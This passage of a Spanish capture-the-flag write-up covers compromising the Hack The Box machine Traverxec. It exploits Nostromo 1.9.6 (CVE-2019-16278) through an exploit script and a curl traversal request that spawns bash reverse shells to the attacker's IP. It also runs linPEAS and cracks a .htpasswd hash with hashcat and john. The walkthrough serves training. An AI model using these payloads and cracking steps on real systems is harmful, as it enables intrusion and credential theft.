+		<span class=c1># Intenta ejecutar estos 3 argumentos (Ejemplo: 10.10.10.165 80 id)</span>
+        <span class=n>cve</span><span class=p>(</span><span class=n>target</span><span class=p>,</span> <span class=n>port</span><span class=p>,</span> <span class=n>cmd</span><span class=p>)</span>
+
+	<span class=c1># Si ocurre un error de índice, como no especificar la IP, imprime el menú de ayuda</span>
+    <span class=k>except</span> <span class=ne>IndexError</span><span class=p>:</span> 
+        <span class=nb>print</span><span class=p>(</span><span class=n>help_menu</span><span class=p>)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Comenta la línea 10:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ sed <span class=s1>&#39;10q;d&#39;</span> 47837.py
+<span class=c1>#cve2019_16278.py</span>
+</code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p><code>NUMq</code> saldrá inmediatamente cuando el número de línea sea NUM.
+<code>d</code> eliminará la línea en lugar de imprimirla; esto se inhibe en la última línea porque la q hace que se omita el resto del script al salir.</p>
+</blockquote>
+<p>Podemos ejecutar con éxito un comando y recibir el resultado:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ python 47837.py 10.10.10.165 <span class=m>80</span> id
+
+
+                                        _____-2019-16278
+        _____  _______    ______   _____<span class=se>\ </span>      _____<span class=se>\ </span>   <span class=se>\_\ </span>     <span class=p>|</span>  <span class=p>|</span>      <span class=p>|</span> /    / <span class=p>|</span>    <span class=p>|</span>
+  /     /<span class=p>|</span>     <span class=o>||</span>     /  /     /<span class=p>|</span>/    /  /___/<span class=p>|</span>
+ /     / /____/<span class=o>||</span><span class=se>\ </span>   <span class=se>\ </span> <span class=se>\ </span>   <span class=p>|</span>/<span class=p>|</span>    <span class=p>|</span>__ <span class=p>|</span>___<span class=p>|</span>/
+<span class=p>|</span>     <span class=p>|</span> <span class=p>|</span>____<span class=p>|</span>/ <span class=se>\ \ </span>   <span class=se>\ </span><span class=p>|</span>    <span class=p>|</span> <span class=p>|</span>       <span class=p>|</span>     <span class=p>|</span>  _____   <span class=se>\|</span>     <span class=se>\|</span>    <span class=p>|</span> <span class=p>|</span>     __/ __
+<span class=p>|</span><span class=se>\ </span>    <span class=se>\|\ </span>   <span class=se>\ </span>  <span class=p>|</span><span class=se>\ </span>        /<span class=p>|</span> <span class=p>|</span><span class=se>\ </span>   <span class=se>\ </span> /  <span class=p>|</span> <span class=se>\_</span>____<span class=se>\|</span>    <span class=p>|</span>   <span class=p>|</span> <span class=se>\_</span>______/ <span class=p>|</span> <span class=p>|</span> <span class=se>\_</span>___<span class=se>\/</span>    <span class=p>|</span>
+<span class=p>|</span> <span class=p>|</span>     /____/<span class=p>|</span>    <span class=se>\ </span><span class=p>|</span>     <span class=p>|</span> /  <span class=p>|</span> <span class=p>|</span>    <span class=p>|</span>____/<span class=p>|</span>
+ <span class=se>\|</span>_____<span class=p>|</span>    <span class=o>||</span>     <span class=se>\|</span>_____<span class=p>|</span>/    <span class=se>\|</span>____<span class=p>|</span>   <span class=p>|</span> <span class=p>|</span>
+        <span class=p>|</span>____<span class=p>|</span>/                        <span class=p>|</span>___<span class=p>|</span>/
+
+
+
+
+HTTP/1.1 <span class=m>200</span> OK
+Date: Sun, <span class=m>17</span> Oct <span class=m>2021</span> 22:25:17 GMT
+Server: nostromo 1.9.6
+Connection: close
+
+
+<span class=nv>uid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Enviamos una reverse shell:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>python 47837.py 10.10.10.165 <span class=m>80</span> <span class=s1>&#39;/bin/bash -c &#34;/bin/bash -i &gt;&amp; /dev/tcp/10.10.16.6/1234 0&gt;&amp;1&#34;&#39;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Recibimos la reverse shell con nc en el puerto 1234:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ nc -lvnp <span class=m>1234</span>
+listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>1234</span> ...
+connect to <span class=o>[</span>10.10.16.6<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.10.165<span class=o>]</span> <span class=m>54928</span>
+bash: cannot <span class=nb>set</span> terminal process group <span class=o>(</span>441<span class=o>)</span>: Inappropriate ioctl <span class=k>for</span> device
+bash: no job control in this shell
+www-data@traverxec:/usr/bin$ whoami
+whoami
+www-data
+www-data@traverxec:/usr/bin$ ip a
+ip a
+1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span class=m>65536</span> qdisc noqueue state UNKNOWN group default qlen <span class=m>1000</span>
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span class=m>1500</span> qdisc pfifo_fast state UNKNOWN group default qlen <span class=m>1000</span>
+    link/ether 00:50:56:b9:a7:98 brd ff:ff:ff:ff:ff:ff
+    inet 10.10.10.165/24 brd 10.10.10.255 scope global eth0
+       valid_lft forever preferred_lft forever
+</code></pre></td></tr></table>
+</div>
+</div><p>Alternativamente, podemos hacerlo manual, vamos a leer código de metasploit:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=k>def</span> <span class=nf>execute_command</span><span class=p>(</span><span class=n>cmd</span><span class=p>,</span> <span class=n>opts</span> <span class=o>=</span> <span class=p>{})</span>
+<span class=n>send_request_cgi</span><span class=p>({</span>
+  <span class=s1>&#39;method&#39;</span>  <span class=o>=&gt;</span> <span class=s1>&#39;POST&#39;</span><span class=p>,</span>
+  <span class=s1>&#39;uri&#39;</span>     <span class=o>=&gt;</span> <span class=n>normalize_uri</span><span class=p>(</span><span class=n>target_uri</span><span class=o>.</span><span class=n>path</span><span class=p>,</span> <span class=s1>&#39;/.%0d./.%0d./.%0d./.%0d./bin/sh&#39;</span><span class=p>),</span>
+  <span class=s1>&#39;headers&#39;</span> <span class=o>=&gt;</span> <span class=p>{</span><span class=s1>&#39;Content-Length:&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;1&#39;</span><span class=p>},</span>
+  <span class=s1>&#39;data&#39;</span>    <span class=o>=&gt;</span> <span class=s2>&#34;echo</span><span class=se>\n</span><span class=s2>echo</span><span class=se>\n</span><span class=si>#{</span><span class=n>cmd</span><span class=si>}</span><span class=s2> 2&gt;&amp;1&#34;</span>
+  <span class=p>}</span>
+<span class=p>)</span>
+<span class=k>end</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Dado que está haciendo un recorrido de directorio y algo de codificación de la URL probablemente para omitir algunos filtros, y además esta haciandolo en una solicitud POST, podemos intentar hacer esto con curl:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ curl -s -X POST <span class=s1>&#39;http://10.10.10.165/.%0d./.%0d./.%0d./bin/sh&#39;</span> -d <span class=s1>&#39;/bin/bash -c &#34;/bin/bash -i &gt;&amp; /dev/tcp/10.10.16.6/53 0&gt;&amp;1&#34;&#39;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Igualmente podemos recibir una shell:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ sudo nc -lnvp <span class=m>53</span>
+listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>53</span> ...
+connect to <span class=o>[</span>10.10.16.6<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.10.165<span class=o>]</span> <span class=m>49166</span>
+bash: cannot <span class=nb>set</span> terminal process group <span class=o>(</span>441<span class=o>)</span>: Inappropriate ioctl <span class=k>for</span> device
+bash: no job control in this shell
+www-data@traverxec:/usr/bin$
+</code></pre></td></tr></table>
+</div>
+</div><h2 id=shell-completamente-interactiva>Shell Completamente Interactiva</h2>
+<p>Podemos habilitar un shell TTY / PTY completo con los siguientes comandos.</p>
+<p>En un shell inverso, iniciamos una shell bash \ (elija uno de los siguientes, la idea es generar un shell bash ):</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-text data-lang=text>script /dev/null -c bash
+python -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;
+echo os.system(&#39;/bin/bash&#39;)
+/bin/bash -i
+perl —e &#39;exec &#34;/bin/bash&#34;;&#39;
+</code></pre></td></tr></table>
+</div>
+</div><p>Presionamos Ctrl + Z para salir de la shell y dejarlo ejecutándose en segundo plano, luego en nuestra consola configuramos la TTY con:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-text data-lang=text>stty raw -echo; fg
+</code></pre></td></tr></table>
+</div>
+</div><p>Reiniciamos la shell inversa con:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-text data-lang=text>reset
+</code></pre></td></tr></table>
+</div>
+</div><p>Definimos el tipo de terminal, <code>xterm</code> que funciona el 99% de las veces:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-text data-lang=text>&gt; Terminal Type? xterm
+</code></pre></td></tr></table>
+</div>
+</div><p>Ahora habiltamos el clear screen y el movimiento con <code>xterm</code> y habilitamos la bash:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-text data-lang=text>export TERM=xterm
+export SHELL=bash
+</code></pre></td></tr></table>
+</div>
+</div><p>En otra consola de nuestro host, obtenemos las filas y columnas de la terminal:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-text data-lang=text>stty -a
+</code></pre></td></tr></table>
+</div>
+</div><p>En la shell inversa, configuramos las filas y las columnas, esto arreglará los márgenes de la terminal:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-text data-lang=text>stty rows &lt;num&gt; columns &lt;cols&gt;
+</code></pre></td></tr></table>
+</div>
+</div><p>Ahora confirmamos que estamos en una shell de TTY o PTY con:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-text data-lang=text>tty
+</code></pre></td></tr></table>
+</div>
+</div><h1 id=escalada-de-privilegios-www-data---david>Escalada de Privilegios: www-data -> david</h1>
+<h2 id=linpeas>linPEAS</h2>
+<p>Descargamos linPEAS desde github:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ wget https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh
+</code></pre></td></tr></table>
+</div>
+</div><p>Montamos un HTTP listener:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ sudo python3 -m http.server <span class=m>80</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Subimos y corremos linPEAS:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>www-data@traverxec:/dev/shm$ wget  10.10.16.6/linpeas.sh
+--2021-10-17 18:33:29--  http://10.10.16.6/linpeas.sh
+Connecting to 10.10.16.6:80... connected.
+HTTP request sent, awaiting response... <span class=m>200</span> OK
+Length: <span class=m>477235</span> <span class=o>(</span>466K<span class=o>)</span> <span class=o>[</span>text/x-sh<span class=o>]</span>
+Saving to: <span class=s1>&#39;linpeas.sh&#39;</span>
+
+     0K .......... .......... .......... .......... .......... 10%  160K 3s
+    50K .......... .......... .......... .......... .......... 21%  518K 2s
+   100K .......... .......... .......... .......... .......... 32%  298K 1s
+   150K .......... .......... .......... .......... .......... 42%  422K 1s
+   200K .......... .......... .......... .......... .......... 53%  346K 1s
+   250K .......... .......... .......... .......... .......... 64%  422K 1s
+   300K .......... .......... .......... .......... .......... 75%  328K 0s
+   350K .......... .......... .......... .......... .......... 85%  318K 0s
+   400K .......... .......... .......... .......... .......... 96%  330K 0s
+   450K .......... ......                                     100% 7.59M<span class=o>=</span>1.4s
+
+2021-10-17 18:33:30 <span class=o>(</span><span class=m>328</span> KB/s<span class=o>)</span> - <span class=s1>&#39;linpeas.sh&#39;</span> saved <span class=o>[</span>477235/477235<span class=o>]</span>
+
+www-data@traverxec:/dev/shm$ chmod +x linpeas.sh
+www-data@traverxec:/dev/shm$ ./linpeas.sh
+</code></pre></td></tr></table>
+</div>
+</div><h2 id=htpasswd>.htpasswd</h2>
+<p>Una de las cosas que descubrió fue un archivo .htpasswd el cual tiene credenciales:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>╔══════════╣ Analyzing Htpasswd Files <span class=o>(</span>limit 70<span class=o>)</span>
+-rw-r--r-- <span class=m>1</span> root bin <span class=m>41</span> Oct <span class=m>25</span>  <span class=m>2019</span> /var/nostromo/conf/.htpasswd
+david:<span class=nv>$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ</span>/
+</code></pre></td></tr></table>
+</div>
+</div><h2 id=crack-htpasswd>Crack .htpasswd</h2>
+<p>Necesitamos encontrar el módulo que necesitaremos usar para hashcat de esta manera pueda reconocer el hash, en base a la salida podemos ver que el tipo de hash es md5crypt y su número de modo es <code>500</code>:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ cat hash.txt
+───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: hash.txt
+───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   <span class=m>1</span>   │ david:<span class=nv>$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ</span>/
+───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+❯ hashcat --example-hashes <span class=p>|</span> grep <span class=s1>&#39;\$1\$&#39;</span> -B <span class=m>2</span>
+
+MODE: <span class=m>500</span>
+TYPE: md5crypt, MD5 <span class=o>(</span>Unix<span class=o>)</span>, Cisco-IOS <span class=nv>$1</span>$ <span class=o>(</span>MD5<span class=o>)</span>
+HASH: <span class=nv>$1$38652870$DUjsu4TTlTsOe</span>/xxZ05uf/
+--
+MODE: <span class=m>12200</span>
+TYPE: eCryptfs
+HASH: <span class=nv>$ecryptfs$0$1$4207883745556753$567</span>daa975114206c
+--
+MODE: <span class=m>16700</span>
+TYPE: FileVault <span class=m>2</span>
+HASH: <span class=nv>$fvde$1$16$84286044060108438487434858307513$20000$f1620ab93192112f0a23eea89b5d4df065661f974b704191</span>
+--
+MODE: <span class=m>22100</span>
+TYPE: BitLocker
+HASH: <span class=nv>$bitlocker$1$16$6</span>f972989ddc209f1eccf07313a7266a2<span class=nv>$1048576$12$3</span>a33a8eaff5e6f81d907b591<span class=nv>$60$316</span>b0f6d4cb445fb056f0e3e0633c413526ff4481bbf588917b70a4e8f8075f5ceb45958a800b42cb7ff9b7f5e1
+7c6145bf8561ea86f52d3592059fb
+</code></pre></td></tr></table>
+</div>
+</div><p>Ahora que conocemos el modo, podemos intentar descifrar el hash:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ find / -name <span class=s1>&#39;hashcat.potfile&#39;</span> 2&gt;/dev/null
+/home/wixnic/.hashcat/hashcat.potfile
+❯ <span class=nb>echo</span> <span class=s1>&#39;&#39;</span> &gt; ~/.hashcat/hashcat.potfile
+❯ hashcat -m <span class=m>500</span> hash.txt /usr/share/wordlists/rockyou.txt --username --force                                                   
+...&lt;SNIP&gt;...
+<span class=nv>$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ</span>/:Nowonly4me
+...&lt;SNIP&gt;...
+</code></pre></td></tr></table>
+</div>
+</div><p>También puedes usar john, pero déjame vaciar mi archivo pot primero:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ find / -name <span class=s1>&#39;john.pot&#39;</span> 2&gt;/dev/null
+/home/wixnic/.john/john.pot
+❯ <span class=nb>echo</span> <span class=s1>&#39;&#39;</span> &gt; ~/.john/john.pot
+</code></pre></td></tr></table>
+</div>
+</div><p>Ahora podemos usar john:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ john --wordlist<span class=o>=</span>/usr/share/wordlists/rockyou.txt hash.txt
+Warning: detected <span class=nb>hash</span> <span class=nb>type</span> <span class=s2>&#34;md5crypt&#34;</span>, but the string is also recognized as <span class=s2>&#34;md5crypt-long&#34;</span>
+Use the <span class=s2>&#34;--format=md5crypt-long&#34;</span> option to force loading these as that <span class=nb>type</span> instead
+Using default input encoding: UTF-8
+Loaded <span class=m>1</span> password <span class=nb>hash</span> <span class=o>(</span>md5crypt, crypt<span class=o>(</span>3<span class=o>)</span> <span class=nv>$1</span>$ <span class=o>(</span>and variants<span class=o>)</span> <span class=o>[</span>MD5 256/256 AVX2 8x3<span class=o>])</span>
+Will run <span class=m>4</span> OpenMP threads
+Press <span class=s1>&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class=k>for</span> status
+Nowonly4me       <span class=o>(</span>david<span class=o>)</span>
+1g 0:00:00:22 DONE <span class=o>(</span>2021-10-17 18:47<span class=o>)</span> 0.04411g/s 466626p/s 466626c/s 466626C/s Noyoudo..Nous4<span class=o>=</span><span class=m>5</span>
+Use the <span class=s2>&#34;--show&#34;</span> option to display all of the cracked passwords reliably
+Session completed
+</code></pre></td></tr></table>
+</div>
+</div><p>Mirando el archivo de configuración de nostromo <code>nhttpd.conf</code>:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>www-data@traverxec:$ <span class=nb>cd</span> /var/nostromo/conf
+www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf
+cat nhttpd.conf
+<span class=c1># MAIN [MANDATORY]</span>
+
+servername              traverxec.htb
+serverlisten            *
+serveradmin             david@traverxec.htb
+serverroot              /var/nostromo
+servermimes             conf/mimes
+docroot                 /var/nostromo/htdocs
+docindex                index.html
+
+<span class=c1># LOGS [OPTIONAL]</span>
+
+logpid                  logs/nhttpd.pid
+
+<span class=c1># SETUID [RECOMMENDED]</span>
+
+user                    www-data
+
+<span class=c1># BASIC AUTHENTICATION [OPTIONAL]</span>
+
+htaccess                .htaccess
+htpasswd                /var/nostromo/conf/.htpasswd
+
+<span class=c1># ALIASES [OPTIONAL]</span>
+
+/icons                  /var/nostromo/icons
+
+<span class=c1># HOMEDIRS [OPTIONAL]</span>
+
+homedirs                /home
+homedirs_public         public_www
+</code></pre></td></tr></table>
+</div>
+</div><p>Podemos ver que este archivo tiene algunos directorios de inicio y uno de ellos es público que apunta a <code>public_www</code> y el administrador del servidor es david.</p>
+<p>Si leemos la página del manual de <a href=https://www.nazgul.ch/dev/nostromo_man.html target=_blank rel="noopener noreffer">nostromo</a>, podemos ver que en la sección de HOMEDIRS dice lo siguiente:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>HOMEDIRS
+     To serve the home directories of your users via HTTP, <span class=nb>enable</span> the homedirs
+     option by defining the path in where the home directories are stored,
+     normally /home.  To access a users home directory enter a ~ in the URL
+     followed by the home directory name like in this example:
+
+           http://www.nazgul.ch/~hacki/
+
+     The content of the home directory is handled exactly the same way as a
+     directory in your document root.  If some users don<span class=err>&#39;</span>t want that their
+     home directory can be accessed via HTTP, they shall remove the world
+     readable flag on their home directory and a <span class=nb>caller</span> will receive a <span class=m>403</span>
+     Forbidden response.  Also, <span class=k>if</span> basic authentication is enabled, a user can
+     create an .htaccess file in his home directory and a <span class=nb>caller</span> will need to
+     authenticate.
+
+     You can restrict the access within the home directories to a single sub
+     directory by defining it via the homedirs_public option.
+</code></pre></td></tr></table>
+</div>
+</div><p>Como podemos ver, si la autenticación básica está habilitada, un usuario puede crear un archivo .htaccess. Anteriormente con linPEAS encontramos un archivo .htpasswd y también hemos descifrado su contraseña, por lo que probablemente tengamos usar las credenciales que tenemos.</p>
+<p>Podemos intentar ir al directorio de inicio de david, que es <code>/home/david/public_www</code>:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ curl 10.10.10.165/~david
+&lt;!DOCTYPE HTML PUBLIC <span class=s2>&#34;-//W3C//DTD HTML 4.01 Transitional//EN&#34;</span>&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;301 Moved Permanently&lt;/title&gt;
